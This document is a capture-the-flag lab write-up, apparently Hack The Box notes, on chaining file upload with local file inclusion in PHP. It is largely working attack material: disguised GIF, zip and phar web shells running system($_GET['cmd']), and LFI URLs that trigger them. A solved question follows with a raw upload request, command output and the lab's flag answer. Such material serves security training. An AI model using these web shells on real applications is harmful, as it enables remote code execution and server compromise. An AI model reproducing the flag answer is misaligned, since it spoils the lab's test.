# LFI and File Upload
As mentioned in the first section, the following are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Function</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4" align="center"><strong class="font-bold">Read Content</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4" align="center"><strong class="font-bold">Execute</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4" align="center"><strong class="font-bold">Remote URL</strong></th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><strong class="font-bold">PHP</strong></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">include()</code>/<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">include_once()</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">require()</code>/<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">require_once()</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">❌</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><strong class="font-bold">NodeJS</strong></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">res.render()</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">❌</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><strong class="font-bold">Java</strong></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">import</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><strong class="font-bold">.NET</strong></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">include</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td></tr></tbody></table>

## Image upload
### Crafting Malicious Image

```sh
$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

### Uploaded File Path
In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:

```
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

Abuse LFI to gain RCE on this uploaded shell:

```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

## Zip Upload
We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:

```
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Once we upload the `shell.jpg` archive, we can include it with the zip wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:

```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

## Phar Upload
Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a phar file and rename it to `shell.jpg` as follows:

```sh
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

## Questions
1. Use any of the techniques covered in this section to gain RCE and read the flag at / **Answer: HTB{upl04d+lf!+3x3cut3=rc3}**
   - Create PHP shell, disguised as a GIF:
        ```sh
        $ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
        ```
   - Upload the GIF under:
        ```
        POST /upload.php HTTP/1.1
        Host: 154.57.164.82:32752
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
        Content-Type: multipart/form-data; boundary=----geckoformboundary58b76c23ac4bee5cde88ca5dc148e516
        Content-Length: 253

        ------geckoformboundary58b76c23ac4bee5cde88ca5dc148e516
        Content-Disposition: form-data; name="uploadFile"; filename="shell.gif"
        Content-Type: image/gif

        GIF8<?php system($_GET["cmd"]); ?>

        ------geckoformboundary58b76c23ac4bee5cde88ca5dc148e516--
        ```
   - Ctrl+U to view the page source and found the img source location at: `profile_images/shell.gif`
   - Use simple LFI to include the GIF and trigger the web shell to read the flag:
        ```
        GET /index.php?language=profile_images/shell.gif&cmd=ls%20/ HTTP/1.1
        
        <SNIP>
        GIF82f40d853e2d4768d87da1c81772bae0a.txt
        <SNIP>
        ```
        ```
        GET /index.php?language=profile_images/shell.gif&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt HTTP/1.1

        <SNIP>
        GIF8HTB{upl04d+lf!+3x3cut3=rc3}
        <SNIP>
        ```